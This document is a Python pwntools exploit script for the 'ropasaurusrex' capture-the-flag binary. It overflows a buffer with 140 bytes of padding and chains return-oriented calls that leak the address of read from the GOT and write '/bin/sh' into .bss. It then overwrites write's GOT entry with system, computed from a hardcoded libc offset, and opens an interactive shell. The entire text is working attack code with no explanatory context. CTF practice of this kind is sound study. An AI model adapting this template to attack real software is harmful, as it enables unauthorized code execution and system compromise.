from pwn import * 
 
p = process('./ropasaurusrex')

read_plt = 0x804832c
read_got = 0x804961c
write_plt = 0x804830c
write_got = 0x8049614
pppr = 0x80484b6
offset = 0x9ad60
bss = 0x8049628
 
 
payload = 'A' * 140
 
payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)
	 
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(bss)
payload += p32(8)
	 
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(write_got)
payload += p32(4)
	 
payload += p32(write_plt)
payload += 'A' * 4
payload += p32(bss)
	 
	 
log.info('Exploit')
p.send(payload)
	 
read_addr = u32(p.recv(4))
	                                     
system_addr = read_addr - offset
	 
p.send('/bin/sh\x00')
p.send(p32(system_addr))
	 
p.interactive()

